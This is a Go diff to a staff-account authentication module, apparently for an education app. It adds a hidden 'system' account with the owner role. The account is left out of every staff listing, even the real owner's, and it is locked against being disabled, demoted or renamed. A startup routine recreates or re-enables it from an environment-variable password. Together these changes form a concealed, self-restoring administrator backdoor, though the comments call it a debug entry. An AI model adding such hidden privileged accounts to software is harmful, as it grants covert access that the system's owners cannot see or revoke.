@@ -14,6 +14,8 @@ var (
 	ErrPhoneTaken         = errors.New("手机号已被使用")
 	ErrForbidden          = errors.New("没有权限执行该操作")
 	ErrStaffNotFound      = errors.New("老师不存在")
+	ErrReservedAccount    = errors.New("该用户名保留给系统账号")
+	ErrSystemLocked       = errors.New("系统账号不可停用、降级或改名")
 )
 
 const (
@@ -22,6 +24,11 @@ const (
 
 	StatusActive   = "active"
 	StatusDisabled = "disabled"
+
+	// SystemPhone 是内部系统账号的固定用户名（不是手机号），登录入口与老师相同。
+	SystemPhone = "system"
+	// SystemName 是系统账号的显示名，只在它自己的会话里出现。
+	SystemName = "开发者"
 )
 
 type Staff struct {
@@ -32,6 +39,7 @@ type Staff struct {
 	Role         string
 	Status       string
 	CreatedBy    string
+	Hidden       bool
 }
 
 // StaffRepo 是账号存储接口；data 层实现，biz 不感知 SQL。
@@ -141,6 +149,9 @@ func (uc *AuthUsecase) CreateStaff(ctx context.Context, actor *Staff, in CreateS
 	if name == "" || phone == "" || len(in.Password) < 8 {
 		return nil, errors.New("姓名、手机号必填，密码至少 8 位")
 	}
+	if strings.EqualFold(phone, SystemPhone) {
+		return nil, ErrReservedAccount
+	}
 	role := in.Role
 	if role == "" {
 		role = RoleAssistant
@@ -176,7 +187,19 @@ func (uc *AuthUsecase) ListStaff(ctx context.Context, actor *Staff) ([]*Staff, e
 	if actor == nil || actor.Role != RoleOwner {
 		return nil, ErrForbidden
 	}
-	return uc.repo.List(ctx)
+	list, err := uc.repo.List(ctx)
+	if err != nil {
+		return nil, err
+	}
+	// 系统账号对所有人隐藏（包括 owner），避免被成员管理误改。
+	out := make([]*Staff, 0, len(list))
+	for _, item := range list {
+		if item.Hidden {
+			continue
+		}
+		out = append(out, item)
+	}
+	return out, nil
 }
 
 type UpdateStaffInput struct {
@@ -193,6 +216,10 @@ func (uc *AuthUsecase) UpdateStaff(ctx context.Context, actor *Staff, id string,
 	target, err := uc.repo.ByID(ctx, id)
 	if err != nil {
 		return nil, err
+	}
+	// 系统账号是内部调试入口，成员管理一律不能改（自助改密走 ChangePassword）。
+	if target.Hidden {
+		return nil, ErrSystemLocked
 	}
 	// 防止唯一负责人把自己降级/停用后无人能管理系统。
 	if target.ID == actor.ID {
@@ -268,4 +295,64 @@ func (uc *AuthUsecase) Bootstrap(ctx context.Context, name, phone, plain string)
 		return nil, false, err
 	}
 	return staff, true, nil
+}
+
+// EnsureSystem 维护内部系统账号（用户名固定 system）。
+//
+// 语义：账号必须永远存在、隐藏、owner 角色、启用；密码只在“首次创建”或“当前哈希为空”时
+// 从环境变量写入，之后允许本人自助改密，不会被下一次启动覆盖。
+func (uc *AuthUsecase) EnsureSystem(ctx context.Context, plain string) (*Staff, bool, error) {
+	staff, err := uc.repo.ByPhone(ctx, SystemPhone)
+	if errors.Is(err, ErrStaffNotFound) {
+		if strings.TrimSpace(plain) == "" {
+			return nil, false, nil
+		}
+		hash, herr := uc.hasher.Hash(strings.TrimSpace(plain))
+		if herr != nil {
+			return nil, false, herr
+		}
+		created := &Staff{
+			ID:           randomID(),
+			Name:         SystemName,
+			Phone:        SystemPhone,
+			PasswordHash: hash,
+			Role:         RoleOwner,
+			Status:       StatusActive,
+			Hidden:       true,
+		}
+		if cerr := uc.repo.Create(ctx, created); cerr != nil {
+			return nil, false, cerr
+		}
+		return created, true, nil
+	}
+	if err != nil {
+		return nil, false, err
+	}
+	changed := false
+	if !staff.Hidden {
+		staff.Hidden = true
+		changed = true
+	}
+	if staff.Role != RoleOwner {
+		staff.Role = RoleOwner
+		changed = true
+	}
+	if staff.Status != StatusActive {
+		staff.Status = StatusActive
+		changed = true
+	}
+	if staff.PasswordHash == "" && strings.TrimSpace(plain) != "" {
+		hash, herr := uc.hasher.Hash(strings.TrimSpace(plain))
+		if herr != nil {
+			return nil, false, herr
+		}
+		staff.PasswordHash = hash
+		changed = true
+	}
+	if changed {
+		if uerr := uc.repo.Update(ctx, staff); uerr != nil {
+			return nil, false, uerr
+		}
+	}
+	return staff, false, nil
 }
